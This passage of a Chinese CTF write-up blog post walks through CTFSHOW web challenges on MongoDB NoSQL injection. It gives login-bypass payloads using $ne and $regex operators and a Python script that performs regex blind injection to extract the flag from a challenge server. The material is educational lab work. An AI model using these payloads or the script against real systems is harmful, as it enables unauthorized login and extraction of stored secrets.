<p>类似于：<br>where username&#x3D;’yu22x’<br>其中userinfo是表名（集合名）<br>而在mongodb中的条件语句有个比较有意思的<br><code>db.userinfo.find(&#123;&quot;likes&quot;:&#123;$ne:20&#125;&#125;)</code><br>类似于where likes !&#x3D; 20<br>所以当我们传入<br>username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1<br>就等价于<br>where username!&#x3D;1&amp;password!&#x3D;1，也就是nosql中的永真式。<br>这边理解参考一下<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664612772005-d81ef1c5-3359-4cfd-b549-dfd416ce43da.png#averageHue=%23e6eaed&clientId=ub39d0df3-e8b6-4&from=paste&id=ua4a37801&name=image.png&originHeight=780&originWidth=1080&originalType=url&ratio=1&rotation=0&showTitle=false&size=161493&status=done&style=none&taskId=ud1553a55-0dba-49cb-a5fe-5873157e0c8&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664612778705-d9d09ec0-ce0c-42ac-9f62-f9adafd49a86.png#averageHue=%23f5f5f8&clientId=ub39d0df3-e8b6-4&from=paste&id=ufe7161ad&name=image.png&originHeight=778&originWidth=1080&originalType=url&ratio=1&rotation=0&showTitle=false&size=157790&status=done&style=none&taskId=uf5f995f6-145a-4879-bdfd-8b01cd5eb1d&title=" alt="image.png"></p>
<h2 id="Web251（同上）"><a href="#Web251（同上）" class="headerlink" title="Web251（同上）"></a>Web251（同上）</h2><p>用上一题的payload发现结果是：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664613287659-12a9b6f5-58f3-4308-bd86-b9106538a246.png#averageHue=%23acacac&clientId=ub39d0df3-e8b6-4&from=paste&height=733&id=u1232f27c&name=image.png&originHeight=916&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58463&status=done&style=none&taskId=u75feed50-210e-4212-afe8-84e163381f4&title=&width=1536" alt="image.png"><br>那么就说明flag不在admin用户中，让username不等于admin即可：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664613317350-22700ca2-8a7c-474c-9ffc-70913adc5fb0.png#averageHue=%23bbbbbb&clientId=ub39d0df3-e8b6-4&from=paste&height=664&id=ua7d418ca&name=image.png&originHeight=830&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53243&status=done&style=none&taskId=u752b3db8-11c9-4e58-ade1-5948bc7138f&title=&width=1536" alt="image.png"></p>
<h2 id="Web252（MongoDB正则）"><a href="#Web252（MongoDB正则）" class="headerlink" title="Web252（MongoDB正则）"></a>Web252（MongoDB正则）</h2><p>语法同上两题一样，MongoDB也是支持正则判断的语法是：**{:{$regex:}}**和上面介绍一样<br>这边先用<code>username[$ne]=1&amp;password[$ne]=1</code>输入之后发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664613560073-bbc7545c-055e-429c-8988-abbac9a813c8.png#averageHue=%23aaaaaa&clientId=ub39d0df3-e8b6-4&from=paste&height=755&id=u3718b4df&name=image.png&originHeight=944&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64845&status=done&style=none&taskId=uea4d2548-6232-4dc8-a077-c8c80076378&title=&width=1536" alt="image.png"><br>和上一题一样，那我们就再让username不等于admin：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664613578150-0de001ab-e386-4e5b-a024-39e701190f97.png#averageHue=%23adacac&clientId=ub39d0df3-e8b6-4&from=paste&height=738&id=u2b2763c6&name=image.png&originHeight=922&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60928&status=done&style=none&taskId=u00103c6a-739c-47f2-aa44-4ab2cc5cbf2&title=&width=1536" alt="image.png"><br>又蹦出来了一个admin1，那我们就匹配正则：<br><code>username[$regex]=^[^a]&amp;password[$ne]=1</code><br>在[]中^表示取反，然后外面的^表示以什么开头，或者<br><code>username[$ne]=1&amp;password[$regex]=^ctfshow&#123;</code>也可以<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664613719917-d2935be1-81b5-41ab-8406-1a59a64f1276.png#averageHue=%239f9f9f&clientId=ub39d0df3-e8b6-4&from=paste&height=816&id=uad537423&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77429&status=done&style=none&taskId=ufb942502-bc4e-4224-a68e-abc615d6a10&title=&width=1536" alt="image.png"></p>
<h2 id="Web253（nosql盲注）"><a href="#Web253（nosql盲注）" class="headerlink" title="Web253（nosql盲注）"></a>Web253（nosql盲注）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664614337417-e5180bd7-0273-4337-8060-e3399c3c65b4.png#averageHue=%23f5f5f5&clientId=ub39d0df3-e8b6-4&from=paste&height=323&id=ue7017c2d&name=image.png&originHeight=404&originWidth=1604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14102&status=done&style=none&taskId=ubd28ff40-8a01-4d5e-8ce1-016ffa891d2&title=&width=1283.2" alt="image.png"><br>查询语句看起来变了实际没变，之前的查询语句实际上也是这样，在上面的文章有讲<br>.pretty()什么用都没有：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664614370896-5e2c5063-c0c6-4c1c-9ecf-a2c959dab598.png#averageHue=%23fcfbfa&clientId=ub39d0df3-e8b6-4&from=paste&height=142&id=u261cfa19&name=image.png&originHeight=178&originWidth=831&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15618&status=done&style=none&taskId=u27af2d44-a99f-4493-bdcb-06b70764596&title=&width=664.8" alt="image.png"><br>这边测试输入<code>username[$ne]=1&amp;password[$regex]=ctfshow&#123;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664614384659-0c72a8b9-a04a-44af-bacb-1024250b1392.png#averageHue=%23f7f5f3&clientId=ub39d0df3-e8b6-4&from=paste&height=61&id=u701eff96&name=image.png&originHeight=76&originWidth=873&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5641&status=done&style=none&taskId=u1efdd62b-5341-48be-9593-fcbd11f2eee&title=&width=698.4" alt="image.png"><br>提示登入成功，但是没有任何数据，我猜测是把所有数据隐藏了<br>输入<code>username[$ne]=1&amp;password[$regex]=ctfshow&#123;a</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664614414556-312b0ffc-97f1-4aa8-be41-c3d7249a936d.png#averageHue=%23f9f8f8&clientId=ub39d0df3-e8b6-4&from=paste&height=90&id=uc6d89c1f&name=image.png&originHeight=112&originWidth=786&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5333&status=done&style=none&taskId=u35955385-fa9c-4426-b012-9cb72be7762&title=&width=628.8" alt="image.png"><br>提示登入失败，说明是可以进行一个regex盲注的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">string=<span class="string">&quot;abcdefghigklmnopqrstuwxyz1230456789&#123;&#125;_-&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">url=<span class="string">&quot;http://f7cf49c4-7bd0-4346-ad4d-1a487ec1088d.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username[$ne]&quot;</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;password[$regex]&quot;</span>:<span class="string">f&quot;ctfshow<span class="subst">&#123;flag+j&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            sign=j</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> sign==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>结束啦！！！！！！！！！！！！</p>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2>
    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a><a href="/tags/CTFSHOW/" class="tag">#CTFSHOW</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/CTFSHOW-PHP/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">CTFSHOW-PHP</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">CTFSHOW-命令执行</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>